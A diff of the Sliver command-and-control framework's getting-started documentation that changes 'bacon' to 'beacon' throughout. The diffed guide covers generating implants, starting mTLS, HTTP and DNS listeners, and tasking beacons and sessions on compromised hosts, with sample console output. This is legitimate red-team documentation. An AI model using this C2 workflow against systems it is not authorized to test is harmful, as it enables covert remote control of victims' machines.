@@ -44,13 +44,13 @@ See [cross-compiling implants](/docs?name=Cross-compiling+Implants) for more det
 
 We strongly recommend using the [nightly framework installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), Sliver expects MSF version 6.2+.
 
-## Implants: Bacon vs. Session
+## Implants: Beacon vs. Session
 
 Sliver is generally designed as a stage 2 payload, and as such we've not yet endeavored to minimize the implant's file size. Depending on how many protocols you enable in your implant the file can get large, we strongly advise the use of [stagers](/docs?name=Stagers) for actual operations (at least in contexts where one may be concerned about file size). Such is the tradeoff for getting easy static compilation in Golang.
 
-Sliver implants in v1.5 and later support two modes of operation: "bacon mode" and "session mode." Bacon mode implements an asynchronous communication style where the implant periodically checks in with the server retrieves tasks, executes them, and returns the results. In "session mode" the implant will create an interactive real time session using either a persistent connection or using long polling depending on the underlying C2 protocol.
+Sliver implants in v1.5 and later support two modes of operation: "beacon mode" and "session mode." Beacon mode implements an asynchronous communication style where the implant periodically checks in with the server retrieves tasks, executes them, and returns the results. In "session mode" the implant will create an interactive real time session using either a persistent connection or using long polling depending on the underlying C2 protocol.
 
-Bacons may be tasked to open interactive sessions over _any C2 protocol they were compiled with_ using the `interactive` command, i.e., if a bacon implant was not compiled with HTTP C2 it cannot open a session over HTTP (use the `close` command to close the session). Currently implants initially compiled for session mode cannot be converted to bacon mode (we may add this feature later). Take this into account during operational planning.
+Beacons may be tasked to open interactive sessions over _any C2 protocol they were compiled with_ using the `interactive` command, i.e., if a beacon implant was not compiled with HTTP C2 it cannot open a session over HTTP (use the `close` command to close the session). Currently implants initially compiled for session mode cannot be converted to beacon mode (we may add this feature later). Take this into account during operational planning.
 
 Some commands such as `shell` and `portfwd` only work over interactive sessions.
 
@@ -64,7 +64,7 @@ Generating implants is done using the `generate` command, you must specify at le
 {"src": "/asciinema/sliver-generate-1.cast", "cols": "132"}
 ```
 
-#### Bacon Mode
+#### Beacon Mode
 
 ```asciinema
 {"src": "/asciinema/sliver-generate-2.cast", "cols": "132"}
@@ -115,7 +115,7 @@ For addition details about each C2 please see:
 
 ## Getting Shells
 
-Before you can catch the shell, you'll first need to start a listener. You use the commands `mtls`, `http`, `https`, and `dns` to start listeners for each protocol (remember endpoints specified with `--http` can connect to a `https` listener). You can use the `jobs` command to view and manage listeners running in the background. Listeners support both sessions and bacons callbacks:
+Before you can catch the shell, you'll first need to start a listener. You use the commands `mtls`, `http`, `https`, and `dns` to start listeners for each protocol (remember endpoints specified with `--http` can connect to a `https` listener). You can use the `jobs` command to view and manage listeners running in the background. Listeners support both sessions and beacons callbacks:
 
 ```
 sliver > mtls
@@ -134,7 +134,7 @@ In this example we're using Mutual TLS, the required certificates for setting up
 
 ### Interacting with Sessions
 
-The `use` command will tab-complete session and bacon identifiers, but you can also type them out if you really want to (identifier prefixes are accepted). Additionally, running the `use` command with no arguments will enter an interactive menu to select from.
+The `use` command will tab-complete session and beacon identifiers, but you can also type them out if you really want to (identifier prefixes are accepted). Additionally, running the `use` command with no arguments will enter an interactive menu to select from.
 
 ```
 [*] Session 8ff2ce4c LONG_DRAMATURGE - [::1]:57154 (MacBook-Pro-6.local) - darwin/amd64 - Thu, 20 Jan 2022 15:45:10 CST
@@ -154,14 +154,14 @@ LONG_DRAMATURGE           6.3 MiB
 
 If you're having problems getting callbacks please see our [troubleshooting guide](/docs?name=Troubleshooting), (TL;DR add the `--debug` flag when generating an implant).
 
-### Interacting with Bacons
+### Interacting with Beacons
 
-Upon initial execution the bacon will register itself with the C2 server and will show up under `bacons`, each instance of a bacon process will get its own id and this id is used for the lifetime of that process (i.e., across key renegotiation, etc). The "Next Check-in" value includes any random jitter (by default up to 30s), and you can also watch your bacons in real time using the `bacons watch` command. Remember to leverage tab complete for the uuid when using `use`:
+Upon initial execution the beacon will register itself with the C2 server and will show up under `beacons`, each instance of a beacon process will get its own id and this id is used for the lifetime of that process (i.e., across key renegotiation, etc). The "Next Check-in" value includes any random jitter (by default up to 30s), and you can also watch your beacons in real time using the `beacons watch` command. Remember to leverage tab complete for the uuid when using `use`:
 
 ```
-[*] Bacon 8c465643 RELATIVE_ADVERTISEMENT - 192.168.1.178:54701 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:40:55 CST
+[*] Beacon 8c465643 RELATIVE_ADVERTISEMENT - 192.168.1.178:54701 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:40:55 CST
 
-[server] sliver > bacons
+[server] sliver > beacons
 
  ID         Name                     Tasks   Transport   Remote Address        Hostname          Username                        Operating System   Last Check-In    Next Check-In
 ========== ======================== ======= =========== ===================== ================= =============================== ================== ================ ===============
@@ -169,17 +169,17 @@ Upon initial execution the bacon will register itself with the C2 server and wil
 
 [server] sliver > use 8c465643-0e65-45f2-bb7e-acb3480de3cb
 
-[*] Active bacon RELATIVE_ADVERTISEMENT (8c465643-0e65-45f2-bb7e-acb3480de3cb)
+[*] Active beacon RELATIVE_ADVERTISEMENT (8c465643-0e65-45f2-bb7e-acb3480de3cb)
 
 [server] sliver (RELATIVE_ADVERTISEMENT) >
 ```
 
-You should see a blue prompt indicating that we're interacting with a bacon as apposed to a session (red). Commands are executed the same way as a session, though not all commands are supported in bacon mode.
+You should see a blue prompt indicating that we're interacting with a beacon as apposed to a session (red). Commands are executed the same way as a session, though not all commands are supported in beacon mode.
 
 ```
 [server] sliver (RELATIVE_ADVERTISEMENT) > ls
 
-[*] Tasked bacon RELATIVE_ADVERTISEMENT (962978a6)
+[*] Tasked beacon RELATIVE_ADVERTISEMENT (962978a6)
 
 [+] RELATIVE_ADVERTISEMENT completed task 962978a6
 
@@ -193,7 +193,7 @@ Tasks will execute in the order they were created (FIFO).
 
 **⚠️ IMPORTANT:** Tasks results will block until all tasks that were part of the same "check-in" have completed. If you have one short running and one long running tasks that are executed as part of the same check-in the short task results will wait for the results of the long running task. Consider executing long running tasks on their own interval. This includes tasks assigned by multiple operators, as the implant is not "aware" of the multiple operators.
 
-You can view previous tasks executed by the active bacon using the `tasks` command:
+You can view previous tasks executed by the active beacon using the `tasks` command:
 
 ```
 [server] sliver (RELATIVE_ADVERTISEMENT) > tasks
@@ -206,22 +206,22 @@ You can view previous tasks executed by the active bacon using the `tasks` comma
 
 You can get the old output from the task using `tasks fetch` and selecting the task you want to see the output from. Operators in multiplayer mode can fetch output from tasks issued by any other operator on the server. However, operators will only see the automatic results from tasks that they themselves executed. You can disable the automatic display of task results using the `settings` command.
 
-#### Switching from Bacon Mode to Session Mode
+#### Switching from Beacon Mode to Session Mode
 
-You can use the `interactive` command to task a bacon to open an interactive session, with no arguments the current C2 channel will be used:
+You can use the `interactive` command to task a beacon to open an interactive session, with no arguments the current C2 channel will be used:
 
 ```
 [server] sliver (RELATIVE_ADVERTISEMENT) > interactive
 
-[*] Using bacon's active C2 endpoint: mtls://192.168.1.150:8888
-[*] Tasked bacon RELATIVE_ADVERTISEMENT (3920e899)
+[*] Using beacon's active C2 endpoint: mtls://192.168.1.150:8888
+[*] Tasked beacon RELATIVE_ADVERTISEMENT (3920e899)
 
 [*] Session 223fac7e RELATIVE_ADVERTISEMENT - 192.168.1.178:54733 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:55:24 CST
 ```
 
 **⚠️ IMPORTANT:** You can only open interactive sessions over C2 protocols that were compiled into the binary. For example, if you did not initially compile an implant with `--http` you won't be able to open an interactive session over HTTP. However, you can specify alternative _endpoints_ (such as a redirector on another domain) using the `interactive` command's flags.
 
-When you're done using the interactive session use the `close` command to close the interactive session without killing the implant; the bacon will still perform check-ins while an interactive session is open.
+When you're done using the interactive session use the `close` command to close the interactive session without killing the implant; the beacon will still perform check-ins while an interactive session is open.
 
 ## Multiple Domains/Protocols
 
